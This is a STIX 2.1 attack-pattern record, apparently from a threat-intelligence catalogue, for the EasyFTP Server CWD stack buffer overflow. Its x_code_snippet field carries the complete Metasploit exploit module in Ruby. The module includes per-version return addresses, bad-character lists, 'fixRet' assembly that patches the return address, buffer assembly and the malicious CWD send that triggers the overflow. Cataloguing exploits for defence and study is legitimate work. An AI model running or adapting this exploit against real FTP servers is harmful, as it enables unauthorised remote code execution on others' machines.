{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--710680b1-3811-48a7-b2fb-ba49acfe8c4d",
    "created": "2024-08-14T16:51:27.371179Z",
    "modified": "2024-08-14T16:51:27.371183Z",
    "name": "EasyFTP Server CWD Command Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in EasyFTP Server 1.7.0.11 and earlier. EasyFTP fails to check input size when parsing 'CWD' commands, which leads to a stack based buffer overflow.  EasyFTP allows anonymous access by default; valid credentials are typically unnecessary to exploit this vulnerability.  After version 1.7.0.12, this package was renamed \"UplusFtp\".  This exploit utilizes a small piece of code that I\\'ve referred to as 'fixRet'. This code allows us to inject of payload of ~500 bytes into a 264 byte buffer by 'fixing' the return address post-exploitation.  See references for more information. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/easyftp_cwd_fixret.rb",
            "external_id": "easyftp_cwd_fixret.rb"
        },
        {
            "source_name": "reference",
            "url": "http://paulmakowski.wordpress.com/2010/02/28/increasing-payload-size-w-return-address-overwrite/"
        },
        {
            "source_name": "reference",
            "url": "http://paulmakowski.wordpress.com/2010/04/19/metasploit-plugin-for-easyftp-server-exploit"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2010/Feb/202"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Ftp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'EasyFTP Server CWD Command Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in EasyFTP Server 1.7.0.11\n        and earlier. EasyFTP fails to check input size when parsing 'CWD' commands, which\n        leads to a stack based buffer overflow.  EasyFTP allows anonymous access by\n        default; valid credentials are typically unnecessary to exploit this vulnerability.\n\n        After version 1.7.0.12, this package was renamed \"UplusFtp\".\n\n        This exploit utilizes a small piece of code that I\\'ve referred to as 'fixRet'.\n        This code allows us to inject of payload of ~500 bytes into a 264 byte buffer by\n        'fixing' the return address post-exploitation.  See references for more information.\n      },\n      'Author'         =>\n        [\n          'Paul Makowski <my.hndl[at]gmail.com>', # original version\n          'jduck' # various fixes, remove most hardcoded addresses\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '62134' ],\n          [ 'BID', '38262' ],\n          [ 'URL', 'http://paulmakowski.wordpress.com/2010/02/28/increasing-payload-size-w-return-address-overwrite/' ],\n          [ 'URL', 'http://paulmakowski.wordpress.com/2010/04/19/metasploit-plugin-for-easyftp-server-exploit' ],\n          [ 'URL', 'https://seclists.org/bugtraq/2010/Feb/202' ]\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          # Total bytes able to write without crashing program (505) - length of fixRet (25) - slack space (30) = 450\n          'Space'    => 505 - 30 - 25,\n          'BadChars' => \"\\x00\\x0a\\x2f\\x5c\", # from: http://downloads.securityfocus.com/vulnerabilities/exploits/38262-1.py\n          'DisableNops' => true\n        },\n      'Platform'\t => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows Universal - v1.7.0.2',   { 'Ret' => 0x00404121 } ], # call edi - from ftpbasicsvr.exe\n          [ 'Windows Universal - v1.7.0.3',   { 'Ret' => 0x00404121 } ], # call edi - from ftpbasicsvr.exe\n          [ 'Windows Universal - v1.7.0.4',   { 'Ret' => 0x00404111 } ], # call edi - from ftpbasicsvr.exe\n          [ 'Windows Universal - v1.7.0.5',   { 'Ret' => 0x004040ea } ], # call edi - from ftpbasicsvr.exe\n          [ 'Windows Universal - v1.7.0.6',   { 'Ret' => 0x004040ea } ], # call edi - from ftpbasicsvr.exe\n          [ 'Windows Universal - v1.7.0.7',   { 'Ret' => 0x004040ea } ], # call edi - from ftpbasicsvr.exe\n          [ 'Windows Universal - v1.7.0.8',   { 'Ret' => 0x004043ca } ], # call edi - from ftpbasicsvr.exe\n          [ 'Windows Universal - v1.7.0.9',   { 'Ret' => 0x0040438a } ], # call edi - from ftpbasicsvr.exe\n          [ 'Windows Universal - v1.7.0.10',  { 'Ret' => 0x0040435a } ], # call edi - from ftpbasicsvr.exe\n          [ 'Windows Universal - v1.7.0.11',  { 'Ret' => 0x0040435a } ], # call edi - from ftpbasicsvr.exe\n        ],\n      'DisclosureDate' => '2010-02-16',\n      'DefaultTarget' => 0))\n  end\n\n  def check\n    connect\n    disconnect\n\n    if (banner =~ /BigFoolCat/) # EasyFTP Server has undergone several name changes\n      return Exploit::CheckCode::Detected\n    end\n      return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect_login\n\n    # If the payload's length is larger than 233 bytes then the payload must be bisected with the return address and later patched.\n    # Explanation of technique: http://paulmakowski.wordpress.com/2010/02/28/increasing-payload-size-w-return-address-overwrite/\n\n    # NOTE:\n    # This exploit jumps to edi, which happens to point at a partial version of\n    # the 'buf' string in memory. The fixRet below fixes up the code stored on the\n    # stack and then jumps there to execute the payload. The value in esp is used\n    # with an offset for the fixup.\n    fixRet_asm = %q{\n      mov ecx, 0xdeadbeef\n      mov edi, esp\n      sub edi, 0xfffffe14\n      mov [edi], ecx\n      add edi, 0xffffff14\n      jmp edi\n    }\n    fixRet = Metasm::Shellcode.assemble(Metasm::Ia32.new, fixRet_asm).encode_string\n\n    buf = ''\n\n    print_status(\"Prepending fixRet...\")\n    buf << fixRet\n    buf << make_nops(0x20 - buf.length)\n    #buf << \"C\" * (0x20 - buf.length)\n\n    print_status(\"Adding the payload...\")\n    buf << payload.encoded\n\n    # Backup the original return address bytes\n    buf[1,4] = buf[268,4]\n\n    print_status(\"Overwriting part of the payload with target address...\")\n    buf[268,4] = [target.ret].pack('V') # put return address @ 268 bytes\n\n    # NOTE: SEH head at offset 256 also gets smashed. That is, it becomes what is at fs:[0] ..\n\n    print_status(\"Sending exploit buffer...\")\n    send_cmd( ['CWD', buf] , false) # this will automatically put a space between 'CWD' and our attack string\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-02-16",
    "x_mitre_platforms": [
        "win'"
    ]
}